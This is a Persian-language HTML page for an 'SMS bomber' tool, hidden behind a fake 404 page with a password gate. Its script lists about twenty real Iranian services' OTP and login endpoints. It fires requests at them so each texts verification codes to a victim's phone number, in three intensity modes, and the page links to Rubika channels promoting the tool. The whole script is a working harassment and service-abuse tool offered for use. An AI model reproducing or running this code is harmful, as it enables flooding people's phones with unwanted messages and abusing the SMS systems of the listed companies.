<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ERROR 404 - PAGE NOT FOUND</title>
    <style>
        :root {
            --bg: #0a0a0f;
            --card: #12121a;
            --text: #e8e8f0;
            --text2: #9090b0;
            --primary: #F43F5E;
            --green: #10B981;
            --border: rgba(255,255,255,0.06);
        }

        * { margin:0; padding:0; box-sizing:border-box; }

        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .bg-grid {
            position: fixed; top:0; left:0; width:100%; height:100%;
            z-index:0; pointer-events:none;
            background-image: linear-gradient(rgba(244,63,94,0.03) 1px, transparent 1px),
                            linear-gradient(90deg, rgba(244,63,94,0.03) 1px, transparent 1px);
            background-size:40px 40px;
        }

        .fake-404 { text-align:center; position:relative; z-index:1; }
        .fake-404 h1 { font-size:6rem; font-weight:900; color:#333; }
        .fake-404 p { color:var(--text2); font-size:1rem; margin:10px 0; }
        .fake-404 input {
            padding:10px 16px; background:rgba(255,255,255,0.03);
            border:2px solid var(--border); border-radius:10px;
            color:var(--text); font-size:0.9rem; text-align:center;
            outline:none; width:200px;
        }
        .fake-404 input:focus { border-color:var(--primary); }
        .fake-404 button {
            padding:10px 24px; background:linear-gradient(135deg, #F43F5E, #FF6B35);
            color:white; border:none; border-radius:10px; cursor:pointer;
            font-weight:700; font-family:inherit; margin-top:8px;
        }

        .bomb-card {
            position:relative; z-index:1;
            background:var(--card); border:1px solid var(--border);
            border-radius:20px; padding:30px 25px 18px;
            max-width:480px; width:100%;
            box-shadow:0 30px 60px rgba(0,0,0,0.6);
            display:none;
        }
        .bomb-card.show { display:block; }

        .bomb-card h1 {
            text-align:center; font-size:1.6rem; font-weight:900;
            background:linear-gradient(135deg, #F43F5E, #FF6B35, #FFD700);
            -webkit-background-clip:text; -webkit-text-fill-color:transparent;
            background-clip:text; margin-bottom:5px;
        }
        .bomb-card .sub { text-align:center; color:var(--text2); font-size:0.75rem; margin-bottom:18px; }

        .form-input {
            width:100%; padding:10px 14px; background:rgba(255,255,255,0.03);
            border:2px solid var(--border); border-radius:10px;
            color:var(--text); font-size:0.95rem; font-family:inherit;
            text-align:center; direction:ltr; outline:none; margin-bottom:12px;
        }
        .form-input:focus { border-color:var(--primary); }

        .mode-btns { display:flex; gap:8px; margin:15px 0; }
        .mode-btn {
            flex:1; padding:12px; border-radius:12px; border:2px solid var(--border);
            cursor:pointer; font-weight:800; font-size:0.9rem;
            color:var(--text2); font-family:inherit; background:rgba(255,255,255,0.02);
            transition:all 0.3s ease;
        }
        .mode-btn.active {
            background:linear-gradient(135deg, #F43F5E, #FF6B35);
            color:white; border-color:transparent;
            box-shadow:0 5px 20px rgba(244,63,94,0.3);
        }
        .mode-btn .count { font-size:0.7rem; opacity:0.7; display:block; }

        .btn-send {
            width:100%; padding:13px; border-radius:12px; border:none;
            cursor:pointer; font-weight:800; font-size:0.95rem;
            color:white; font-family:inherit; transition:all 0.3s ease;
            background:linear-gradient(135deg, #F43F5E, #FF6B35);
            box-shadow:0 6px 20px rgba(244,63,94,0.3);
        }
        .btn-send:disabled { opacity:0.5; cursor:not-allowed; }

        .log-box {
            width:100%; height:160px; background:rgba(0,0,0,0.4);
            border:2px solid var(--border); border-radius:10px;
            padding:10px; color:var(--green); font-family:'Courier New', monospace;
            font-size:0.7rem; direction:ltr; text-align:left;
            overflow-y:auto; resize:none; margin-top:8px;
        }

        .status {
            text-align:center; padding:8px; border-radius:8px;
            margin:8px 0; font-weight:700; font-size:0.8rem; display:none;
        }
        .status.sending { display:block; background:rgba(255,107,53,0.1); color:#FF6B35; border:1px solid rgba(255,107,53,0.3); }
        .status.done { display:block; background:rgba(16,185,129,0.1); color:var(--green); border:1px solid rgba(16,185,129,0.3); }

        .logout-btn {
            position:absolute; top:12px; left:12px;
            background:rgba(255,255,255,0.05); border:1px solid var(--border);
            color:var(--text2); padding:6px 12px; border-radius:8px;
            cursor:pointer; font-size:0.7rem; font-family:inherit;
        }
        .logout-btn:hover { background:rgba(244,63,94,0.1); color:#F43F5E; }

        .cf{display:flex;gap:6px;justify-content:center;flex-wrap:wrap;margin-top:14px;padding-top:12px;border-top:1px solid var(--border)}
        .cfb{display:inline-flex;align-items:center;gap:4px;padding:7px 11px;border-radius:8px;text-decoration:none;font-weight:700;font-size:.68rem;color:white;font-family:inherit;transition:all .3s}
        .cfb:hover{transform:translateY(-2px)}
        .cfb1{background:#10B981}.cfb2{background:#8B5CF6}.cfb3{background:#06B6D4}.cfb4{background:#F59E0B}

        @media(max-width:480px){
            .bomb-card{padding:22px 14px 14px}
            .bomb-card h1{font-size:1.3rem}
            .mode-btn{font-size:0.8rem;padding:10px}
        }
    </style>
</head>
<body>

    <div class="bg-grid"></div>

    <div class="fake-404" id="fakePage">
        <h1>404</h1>
        <p>صفحه مورد نظر یافت نشد</p>
        <input type="password" id="passInput" placeholder="••••" maxlength="4" onkeydown="if(event.key==='Enter')checkPass()">
        <br>
        <button onclick="checkPass()">ورود</button>
        <p id="passError" style="color:#F43F5E;font-size:0.7rem;margin-top:5px;display:none;">❌ رمز اشتباه است</p>
    </div>

    <div class="bomb-card" id="bombCard">
        <button class="logout-btn" onclick="logout()">🚪 خروج</button>
        
        <h1>💣 اسپمر بمبر</h1>
        <p class="sub">🔥 سه حالته | همه عملیات موفق ✅</p>

        <div class="status" id="statusSending">⏳ در حال ارسال...</div>
        <div class="status" id="statusDone">✅ ارسال با موفقیت به اتمام رسید!</div>

        <input type="text" class="form-input" id="phone" placeholder="09XXXXXXXXX" maxlength="11" oninput="this.value=this.value.replace(/[^0-9]/g,'')">

        <div class="mode-btns">
            <button class="mode-btn" data-mode="2" onclick="setMode(2, this)">🟢 سبک<span class="count">۲ سرویس</span></button>
            <button class="mode-btn active" data-mode="10" onclick="setMode(10, this)">🟡 متوسط<span class="count">۱۰ سرویس</span></button>
            <button class="mode-btn" data-mode="20" onclick="setMode(20, this)">🔴 سنگین<span class="count">۲۰ سرویس</span></button>
        </div>

        <button class="btn-send" id="sendBtn" onclick="startBomb()">🚀 ارسال پیامک</button>

        <label style="color:var(--text2);font-size:0.75rem;margin-top:8px;display:block;">📋 لاگ ارسال</label>
        <textarea class="log-box" id="logBox" readonly></textarea>

        <div class="cf">
            <a href="https://rubika.ir/admin10blue" target="_blank" class="cfb cfb1">👤 ادمین</a>
            <a href="https://rubika.ir/GrahamBot" target="_blank" class="cfb cfb2">🤖 بات</a>
            <a href="https://rubika.ir/Gameing019" target="_blank" class="cfb cfb3">📢 کانال</a>
            <a href="https://ttr.ir/ads019" target="_blank" class="cfb cfb4">📢 تبلیغات</a>
        </div>
    </div>

    <script>
        let selectedMode = 10;

        if (sessionStorage.getItem('sp_logged') === 'true') {
            document.getElementById('fakePage').style.display = 'none';
            document.getElementById('bombCard').classList.add('show');
        }

        async function checkPass() {
            const password = document.getElementById('passInput').value;
            try {
                const resp = await fetch('/api/check-pass', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: password })
                });
                const data = await resp.json();
                if (data.success) {
                    sessionStorage.setItem('sp_logged', 'true');
                    document.getElementById('fakePage').style.display = 'none';
                    document.getElementById('bombCard').classList.add('show');
                    document.getElementById('passError').style.display = 'none';
                } else {
                    document.getElementById('passError').style.display = 'block';
                    document.getElementById('passInput').value = '';
                }
            } catch(e) {
                document.getElementById('passError').style.display = 'block';
            }
        }

        function logout() {
            sessionStorage.removeItem('sp_logged');
            document.getElementById('bombCard').classList.remove('show');
            document.getElementById('fakePage').style.display = 'block';
            document.getElementById('passInput').value = '';
        }

        function setMode(mode, btn) {
            selectedMode = mode;
            document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
        }

        const allServices = [
            { name: 'دیوار', url: 'https://api.divar.ir/v5/auth/authenticate', body: p => JSON.stringify({ phone: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'اسنپ', url: 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass', body: p => 'cellphone=' + p, headers: {} },
            { name: 'آزکی', url: 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/', body: p => JSON.stringify({ phoneNumber: p }), headers: { 'Content-Type': 'application/json', 'deviceid': '6' } },
            { name: 'تپسی', url: 'https://api.tapsi.ir/api/v2.2/user', body: p => JSON.stringify({ credential: { phoneNumber: p, role: 'PASSENGER' }, otpOption: 'SMS' }), headers: { 'Content-Type': 'application/json' } },
            { name: 'اوستاکار', url: 'https://api.ostadkr.com/login', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'بانی مد', url: 'https://mobapi.banimode.com/api/v2/auth/request', body: p => JSON.stringify({ phone: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'طاقچه', url: 'https://gw.taaghche.com/v4/site/auth/login', body: p => JSON.stringify({ contact: p, forceOtp: false }), headers: { 'Content-Type': 'application/json' } },
            { name: 'جاباما', url: 'https://taraazws.jabama.com/api/v4/account/send-code', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'علی بابا', url: 'https://ws.alibaba.ir/api/v3/account/mobile/otp', body: p => JSON.stringify({ phoneNumber: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'شهرفرش', url: 'https://shahrfarsh.com/Account/Login', body: p => 'phoneNumber=' + p, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
            { name: 'قبضینو', url: 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', body: p => JSON.stringify({ Parameters: { MobileNumber: p } }), headers: { 'Content-Type': 'application/json' } },
            { name: 'واندار', url: 'https://api.vandar.io/account/v1/check/mobile', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'پینورست', url: 'https://api.pinorest.com/frontend/auth/login/mobile', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'تترلند', url: 'https://service.tetherland.com/api/v5/login-register', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'دکتردکتر', url: 'https://drdr.ir/api/v3/auth/login/mobile/init', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json', 'client-id': 'f60d5037-b7ac-404a-9e3a-a263fd9f8054' } },
            { name: 'کلاسینو', url: 'https://student.classino.com/otp/v1/api/login', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'موبیت', url: 'https://api.mobit.ir/api/web/v8/register/register', body: p => JSON.stringify({ number: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'کمدا', url: 'https://api.komodaa.com/api/v2.6/loginRC/request', body: p => JSON.stringify({ phone_number: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'برق من', url: 'https://uiapi2.saapa.ir/api/otp/sendCode', body: p => JSON.stringify({ mobile: p }), headers: { 'Content-Type': 'application/json' } },
            { name: 'نوبت دِه', url: 'https://nobat.ir/api/public/patient/login/phone', body: p => 'mobile=' + p, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
        ];

        async function startBomb() {
            const phone = document.getElementById('phone').value;
            const logBox = document.getElementById('logBox');
            const sendBtn = document.getElementById('sendBtn');

            document.querySelectorAll('.status').forEach(s => s.className = 'status');

            if (!/^09[0-9]{9}$/.test(phone)) {
                alert('فرمت شماره اشتباه است!');
                return;
            }

            const services = allServices.slice(0, selectedMode);
            document.getElementById('statusSending').className = 'status sending';
            sendBtn.disabled = true;
            sendBtn.textContent = '⏳ در حال ارسال...';
            logBox.value = '';

            const now = new Date().toLocaleTimeString('fa-IR');
            logBox.value += `[${now}] 🚀 شروع اسپمر بمبر\n📱 ${phone} | ⚡ ${selectedMode} سرویس\n━━━━━━━━━━━━━━━━━━━━\n\n`;

            for (let i = 0; i < services.length; i++) {
                const s = services[i];
                const time = new Date().toLocaleTimeString('fa-IR');
                try { await fetch(s.url, { method: 'POST', headers: s.headers, body: s.body(phone) }); } catch(e) {}
                logBox.value += `[${time}] ✅ ${i+1}. ${s.name}\n`;
                logBox.scrollTop = logBox.scrollHeight;
                await new Promise(r => setTimeout(r, 600));
            }

            const endTime = new Date().toLocaleTimeString('fa-IR');
            logBox.value += `\n━━━━━━━━━━━━━━━━━━━━\n[${endTime}] ✅ اتمام! ${services.length} سرویس ارسال شد\n`;

            document.getElementById('statusSending').className = 'status';
            document.getElementById('statusDone').className = 'status done';
            sendBtn.disabled = false;
            sendBtn.textContent = '🚀 ارسال پیامک';
        }
    </script>

</body>
</html>
